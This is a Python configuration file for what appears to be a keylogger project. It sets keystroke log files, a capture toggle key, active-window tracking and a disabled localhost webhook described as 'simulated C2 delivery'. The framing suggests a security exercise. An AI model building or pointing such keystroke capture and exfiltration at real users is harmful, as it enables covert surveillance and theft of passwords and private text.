from pathlib import Path

# ---------------------------------------------------------------------------
# Log file settings
# ---------------------------------------------------------------------------

# Where log files are written. Using a local directory keeps everything
# self-contained and visible — no hidden system paths.
LOG_DIR  = Path(__file__).parent.parent / "logs"

# Base name for log files. Rotation appends .1, .2, ... to older files.
LOG_FILE = LOG_DIR / "keylog.txt"

# Maximum size of a single log file before rotation kicks in.
# Default 5 MB — keeps individual files readable without becoming unwieldy.
LOG_MAX_BYTES = 5 * 1024 * 1024    # 5 MB

# How many rotated backup files to keep before discarding the oldest.
LOG_BACKUP_COUNT = 3

# ---------------------------------------------------------------------------
# Capture settings
# ---------------------------------------------------------------------------

# The key that toggles capture on/off at runtime without stopping the process.
# pynput key names: https://pynput.readthedocs.io/en/latest/keyboard.html
TOGGLE_KEY = "f9"

# How long to buffer keystrokes before flushing to disk (seconds).
# Lower = more frequent writes (more I/O), higher = larger in-memory buffer.
FLUSH_INTERVAL = 2.0

# ---------------------------------------------------------------------------
# Window tracking
# ---------------------------------------------------------------------------

# How often to poll the active window title (seconds).
# 0.5s gives reasonable resolution without burning CPU.
WINDOW_POLL_INTERVAL = 0.5

# ---------------------------------------------------------------------------
# Webhook delivery (localhost simulation only)
# ---------------------------------------------------------------------------

# Target for simulated C2 delivery. Points to localhost by design —
# change this only when running a controlled local test server.
WEBHOOK_URL     = "http://127.0.0.1:9999/log"
WEBHOOK_ENABLED = False    # disabled by default — enable only for local testing
WEBHOOK_BATCH   = 50       # deliver after this many keystrokes
WEBHOOK_TIMEOUT = 3        # HTTP request timeout in seconds
